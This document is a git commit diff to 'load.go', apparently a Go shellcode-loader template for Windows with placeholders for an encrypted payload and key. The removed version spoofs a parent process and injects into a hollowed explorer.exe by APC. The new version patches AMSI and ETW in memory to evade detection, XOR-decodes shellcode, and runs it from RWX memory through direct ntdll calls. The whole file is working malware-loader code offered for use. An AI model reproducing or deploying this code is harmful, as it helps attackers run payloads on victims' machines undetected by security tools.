0ad471b9bc21055a24a38dcac97936a0f28ddf3c
senpaisamp <98622787+senpaisamp@users.noreply.github.com>
2025-06-24 01:53:41 +0200

    Update load.go

--- load.go
+++ load.go
@@ -1,161 +1,97 @@
-// +build windows,amd64,!cgo
+//go:build windows && amd64
+
 package main
 
 import (
 	"encoding/base64"
-	"errors"
-	"log"
-	"strings"
+	"fmt"
 	"syscall"
 	"unsafe"
 	"golang.org/x/sys/windows"
 )
 
 var (
-	key = "§key§"
+	modntdll                = syscall.NewLazyDLL("ntdll.dll")
+	ntAllocateVirtualMemory = modntdll.NewProc("NtAllocateVirtualMemory")
+	ntWriteVirtualMemory    = modntdll.NewProc("NtWriteVirtualMemory")
+	ntCreateThreadEx        = modntdll.NewProc("NtCreateThreadEx")
+	ntProtectVirtualMemory  = modntdll.NewProc("NtProtectVirtualMemory")
+	ntWaitForSingleObject   = modntdll.NewProc("NtWaitForSingleObject")
 )
 
-// --- Configurable section ---
-const (
-	pprocName  = "§explorer.exe§"              // PPID spoof target
-	targetPath = "§c:\\windows\\explorer.exe§"  // Hollowing target
-	shellcodeB64 = "§shellcode§"
+var (
+	encryptedShellcode = "§shellcode§"
+	encryptionKey      = "§key§"
 )
 
-func bake(cipher string) string {
-	tmp, _ := base64.StdEncoding.DecodeString(cipher)
-	_key, _ := base64.StdEncoding.DecodeString(key)
-	baked := make([]byte, len(tmp))
-	for i := range tmp {
-		baked[i] = tmp[i] ^ _key[i%len(_key)]
+func xorDecode(data, key []byte) []byte {
+	res := make([]byte, len(data))
+	for i := range data {
+		res[i] = data[i] ^ key[i%len(key)]
 	}
-	return string(baked)
+	return res
 }
 
-func polish(cipher string) []byte {
-	tmp, _ := base64.StdEncoding.DecodeString(cipher)
-	_key, _ := base64.StdEncoding.DecodeString(key)
-	polished := make([]byte, len(tmp))
-	for i := range tmp {
-		polished[i] = tmp[i] ^ _key[i%len(_key)]
+func patchMemory(addr uintptr, patch []byte) error {
+	var oldProtect uint32
+	size := uintptr(len(patch))
+	r1, _, _ := ntProtectVirtualMemory.Call(
+		uintptr(^uintptr(0)),
+		uintptr(unsafe.Pointer(&addr)),
+		uintptr(unsafe.Pointer(&size)),
+		windows.PAGE_EXECUTE_READWRITE,
+		uintptr(unsafe.Pointer(&oldProtect)),
+	)
+	if r1 != 0 {
+		return fmt.Errorf("NtProtectVirtualMemory failed")
 	}
-	return polished
+	for i := 0; i < len(patch); i++ {
+		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = patch[i]
+	}
+	return nil
 }
 
-// --- Windows process utils ---
-type windowsProcess struct {
-	ProcessID int
-	Exe       string
-}
+func unhookAMSIandETW() {
+	amsi, _ := syscall.LoadLibrary("amsi.dll")
+	addr, _ := syscall.GetProcAddress(syscall.Handle(amsi), "AmsiScanBuffer")
+	patch := []byte{0x31, 0xC0, 0xC3} // xor eax,eax; ret
+	_ = patchMemory(uintptr(addr), patch)
 
-func enumProcesses() []windowsProcess {
-	hSnap, _ := syscall.CreateToolhelp32Snapshot(0x2, 0)
-	defer syscall.CloseHandle(hSnap)
-
-	var entry syscall.ProcessEntry32
-	entry.Size = uint32(unsafe.Sizeof(entry))
-
-	procs := []windowsProcess{}
-	if err := syscall.Process32First(hSnap, &entry); err != nil {
-		return procs
-	}
-	for {
-		exe := syscall.UTF16ToString(entry.ExeFile[:])
-		procs = append(procs, windowsProcess{int(entry.ProcessID), exe})
-		if err := syscall.Process32Next(hSnap, &entry); err != nil {
-			break
-		}
-	}
-	return procs
-}
-
-func findPPID(name string) int {
-	procs := enumProcesses()
-	for _, p := range procs {
-		if strings.ToLower(p.Exe) == strings.ToLower(name) {
-			return p.ProcessID
-		}
-	}
-	return 0
-}
-
-func injectViaAPC(shellcode []byte, pid uint32) error {
-	var hProc windows.Handle
-	hProc, err := windows.OpenProcess(windows.PROCESS_ALL_ACCESS, false, pid)
-	if err != nil {
-		return err
-	}
-	defer windows.CloseHandle(hProc)
-
-	addr, err := windows.VirtualAllocEx(hProc, 0, uintptr(len(shellcode)), 0x3000, 0x40)
-	if err != nil {
-		return err
-	}
-
-	var written uintptr
-	err = windows.WriteProcessMemory(hProc, addr, &shellcode[0], uintptr(len(shellcode)), &written)
-	if err != nil {
-		return err
-	}
-
-	hThreadSnap, _ := syscall.CreateToolhelp32Snapshot(0x00000004, pid)
-	defer syscall.CloseHandle(hThreadSnap)
-
-	var threadEntry syscall.ThreadEntry32
-	threadEntry.Size = uint32(unsafe.Sizeof(threadEntry))
-	if syscall.Thread32First(hThreadSnap, &threadEntry) != nil {
-		return errors.New("[-] Thread enumeration failed")
-	}
-
-	for {
-		if threadEntry.OwnerProcessID == pid {
-			hThread, err := windows.OpenThread(0x0010|0x0020, false, threadEntry.ThreadID)
-			if err == nil {
-				windows.QueueUserAPC(addr, hThread, 0)
-				windows.CloseHandle(hThread)
-				return nil
-			}
-		}
-		if syscall.Thread32Next(hThreadSnap, &threadEntry) != nil {
-			break
-		}
-	}
-	return errors.New("[-] No suitable thread found")
+	ntdll, _ := syscall.LoadLibrary("ntdll.dll")
+	etw, _ := syscall.GetProcAddress(syscall.Handle(ntdll), "EtwEventWrite")
+	etwPatch := []byte{0xC3} // ret
+	_ = patchMemory(uintptr(etw), etwPatch)
 }
 
 func main() {
-	sc := polish(shellcodeB64)
-	pid := findPPID(pprocName)
-	if pid == 0 {
-		log.Fatal("[-] PPID not found")
+	unhookAMSIandETW()
+
+	shellEnc, _ := base64.StdEncoding.DecodeString(encryptedShellcode)
+	key, _ := base64.StdEncoding.DecodeString(encryptionKey)
+	shellcode := xorDecode(shellEnc, key)
+
+	var baseAddr uintptr = 0
+	size := uintptr(len(shellcode))
+	procHandle := uintptr(^uintptr(0))
+
+	r1, _, _ := ntAllocateVirtualMemory.Call(procHandle, uintptr(unsafe.Pointer(&baseAddr)), 0, uintptr(unsafe.Pointer(&size)), 0x3000, 0x40)
+	if r1 != 0 {
+		fmt.Println("[-] Memory allocation failed")
+		return
 	}
 
-	// Create suspended process
-	var si windows.StartupInfoEx
-	var pi windows.ProcessInformation
-	attrListLen := uintptr(0)
-	windows.InitializeProcThreadAttributeList(nil, 1, 0, &attrListLen)
-	attrList := make([]byte, attrListLen)
-	si.ProcThreadAttributeList = &attrList[0]
-	windows.InitializeProcThreadAttributeList(si.ProcThreadAttributeList, 1, 0, &attrListLen)
-
-	hParent, _ := windows.OpenProcess(windows.PROCESS_CREATE_PROCESS, false, uint32(pid))
-	windows.UpdateProcThreadAttribute(si.ProcThreadAttributeList, 0, 0x00020000, uintptr(hParent), unsafe.Sizeof(hParent), 0, nil)
-
-	si.Cb = uint32(unsafe.Sizeof(si))
-	creationFlags := uint32(windows.CREATE_SUSPENDED | windows.EXTENDED_STARTUPINFO_PRESENT | windows.CREATE_NO_WINDOW)
-	target, _ := windows.UTF16PtrFromString(targetPath)
-	err := windows.CreateProcess(nil, target, nil, nil, false, creationFlags, nil, nil, &si.StartupInfo, &pi)
-	if err != nil {
-		log.Fatal(err)
+	r2, _, _ := ntWriteVirtualMemory.Call(procHandle, baseAddr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), 0)
+	if r2 != 0 {
+		fmt.Println("[-] Writing shellcode failed")
+		return
 	}
 
-	// Inject into new process
-	err = injectViaAPC(sc, pi.ProcessId)
-	if err != nil {
-		log.Fatal(err)
+	var threadHandle uintptr
+	r3, _, _ := ntCreateThreadEx.Call(uintptr(unsafe.Pointer(&threadHandle)), 0x1FFFFF, 0, procHandle, baseAddr, 0, 0, 0, 0, 0, 0)
+	if r3 != 0 {
+		fmt.Println("[-] Thread creation failed")
+		return
 	}
 
-	// Resume main thread
-	windows.ResumeThread(pi.Thread)
+	ntWaitForSingleObject.Call(threadHandle, 0xFFFFFFFF)
 }
